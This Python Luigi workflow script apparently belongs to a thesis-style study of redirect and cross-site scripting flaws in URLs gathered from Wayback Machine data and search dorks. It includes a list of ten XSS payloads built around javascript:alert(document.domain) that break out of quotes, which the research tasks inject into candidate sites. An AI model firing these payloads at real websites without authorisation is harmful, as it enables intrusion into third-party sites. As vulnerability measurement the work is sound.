import os

import luigi

from dotenv import load_dotenv

from workflows.evaluate import CollectUrlStats
from workflows.evaluate import CollectNotVulnerable
from workflows.evaluate import CollectVulnerable
from workflows.evaluate import CollectCandidates
from workflows.evaluate import CollectCandidatesIncUrlStrats
from workflows.evaluate import CollectTestedCandidates
from workflows.evaluate import CollectScreenshots
from workflows.evaluate import CollectDialogs
from workflows.evaluate import CollectUnmatchedLogs
from workflows.evaluate import PrepareTableUnique
from workflows.evaluate import PreparePayloadScreenshots
from workflows.evaluate import PrepareXssDialogs

from workflows.logging import configure_logging


def prepare_table_unique_args():
    list = []

    args = {}
    args["src_dir"] = "data/wayback"
    args["out_dir"] = "outputs/manual_analysis/wayback"
    list.append(args)

    args = {}
    args["src_dir"] = "data/dork"
    args["out_dir"] = "outputs/manual_analysis/dork"
    list.append(args)

    return list

def prepare_payload_screenshots_args():
    list = []

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/candidates.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/screenshots/payload"
    args["target_url"] = "https://thesis.test"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/dork/candidates.json"
    args["out_dir"] = "outputs/manual_analysis/dork/screenshots/payload"
    args["target_url"] = "https://thesis.test"
    list.append(args)

    return list

def prepare_xss_dialogs_xss():
    list = []

    payloads = { 
            "a": 'javascript:alert(document.domain)//',
            "b": 'jav\\naScript:alert(document.domain)',
            "c": 'D0M4IN_PL4C3H0LD3R"+%2b+alert(document.domain)+%2b+"',
            "d": "D0M4IN_PL4C3H0LD3R'+%2b+alert(document.domain)+%2b+'",
            "e": '"+%2b+alert(document.domain)+%2b+"D0M4IN_PL4C3H0LD3R',
            "f": "'+%2b+alert(document.domain)+%2b+'D0M4IN_PL4C3H0LD3R",
            "g": '//D0M4IN_PL4C3H0LD3R"+%2b+alert(document.domain)+%2b+"',
            "h": "//D0M4IN_PL4C3H0LD3R'+%2b+alert(document.domain)+%2b+'",
            "i": 'https://D0M4IN_PL4C3H0LD3R"+%2b+alert(document.domain)+%2b+"',
            "j": "https://D0M4IN_PL4C3H0LD3R'+%2b+alert(document.domain)+%2b+'",
    }

    for name, payload in payloads.items():
        args = {}
        args["src_file_json"] = "outputs/manual_analysis/wayback/candidates.json"
        args["out_dir"] = "outputs/manual_analysis/wayback/xss"
        args["payload"] = payload
        args["name"] = name
        list.append(args)

        args = {}
        args["src_file_json"] = "outputs/manual_analysis/dork/candidates.json"
        args["out_dir"] = "outputs/manual_analysis/dork/xss"
        args["payload"] = payload
        args["name"] = name
        list.append(args)

    return list


def collect_payload_screenshots_args():
    list = []

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/screenshots/payload/screenshots.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/screenshots/payload"
    args["out_name"] = "payload_screenshots.txt"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/dork/screenshots/payload/screenshots.json"
    args["out_dir"] = "outputs/manual_analysis/dork/screenshots/payload"
    args["out_name"] = "payload_screenshots.txt"
    list.append(args)

    return list

def collect_xss_dialogs_args():
    list = []

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_a.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_a_result.json"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_b.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_b_result.json"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_c.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_c_result.json"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_d.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_d_result.json"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_e.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_e_result.json"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/xss/xss_f.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/xss"
    args["out_name"] = "xss_f_result.json"
    list.append(args)

    return list

def collect_unmatched_logs_args():
    list = []

    args = {}
    args["src_dir"] = "data/server_logs"
    args["src_file_nv_json"] = "outputs/manual_analysis/wayback/not_vulnerable.json"
    args["src_file_json"] = "outputs/manual_analysis/wayback/vulnerable.json"
    args["out_dir"] = "outputs/manual_analysis/wayback/logs"
    list.append(args)

    args = {}
    args["src_dir"] = "data/server_logs"
    args["src_file_nv_json"] = "outputs/manual_analysis/dork/not_vulnerable.json"
    args["src_file_json"] = "outputs/manual_analysis/dork/vulnerable.json"
    args["out_dir"] = "outputs/manual_analysis/dork/logs"
    list.append(args)

    return list


def collect_url_stats_args():
    list = []

    args = {}
    args["src_dir"] = "data/wayback/collected/urls"
    args["out_dir"] = "outputs/manual_analysis/wayback"
    list.append(args)

    args = {}
    args["src_dir"] = "data/dork/collected/data"
    args["out_dir"] = "outputs/manual_analysis/dork"
    list.append(args)

    return list

def collect_candidates_inc_url_strat_args():
    list = []

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/wayback/vulnerable.json"
    args["out_dir"] = "outputs/manual_analysis/wayback"
    list.append(args)

    args = {}
    args["src_file_json"] = "outputs/manual_analysis/dork/vulnerable.json"
    args["out_dir"] = "outputs/manual_analysis/dork"
    list.append(args)

    return list


def run():

    configure_logging()
    load_dotenv()

    config_path = "configs/debug.cfg"
    config = luigi.configuration.get_config()
    config.read(config_path)

    # Collect All
    for args in collect_candidates_inc_url_strat_args():
        tasks = [ CollectCandidatesIncUrlStrats(**args)]
        luigi.build(tasks, workers=1, local_scheduler=True)

    # Collect All
    # for args in prepare_table_unique_args():
    #     tasks = [ CollectNotVulnerable(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)
 

    # for args in prepare_table_unique_args():
    #     tasks = [ PrepareTableUnique(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in prepare_payload_screenshots_args():
    #     tasks = [ PreparePayloadScreenshots(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in prepare_xss_dialogs_xss():
    #     tasks = [ PrepareXssDialogs(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in collect_payload_screenshots_args():
    #     tasks = [ CollectScreenshots(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in collect_payload_screenshots_args():
    #     tasks = [ CollectDialogs(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in collect_unmatched_logs_args():
    #     tasks = [ CollectUnmatchedLogs(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

    # for args in collect_url_stats_args():
    #     tasks = [ CollectUrlStats(**args)]
    #     luigi.build(tasks, workers=1, local_scheduler=True)

if __name__ == "__main__":
    run()

